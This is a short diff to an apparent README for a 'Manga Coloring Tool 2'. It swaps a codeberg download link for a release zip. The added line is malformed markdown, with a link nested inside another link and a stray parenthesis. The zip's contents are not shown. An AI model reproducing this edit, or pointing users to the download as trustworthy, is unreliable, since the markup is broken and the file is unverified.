@@ -4,7 +4,8 @@
 
 <div align="center">
 
- # 🚀 [DOWNLOAD MANGA COLORING TOOL 2](https://codeberg.org/Gladioul/Manga_Coloring_Tool/raw/branch/main/release/Manga%20Coloring%20Tool%20V2.0.0.zip)
+ # 🚀 [DOWNLOAD MANGA COLORING TOOL 2]( # 🚀 [DOWNLOAD MANGA COLORING TOOL 2](https://codeberg.org/Gladioul/Manga_Coloring_Tool_2/releases/download/1.0/manga_coloring_tool_2.zip)
+)
 
 </div>
 
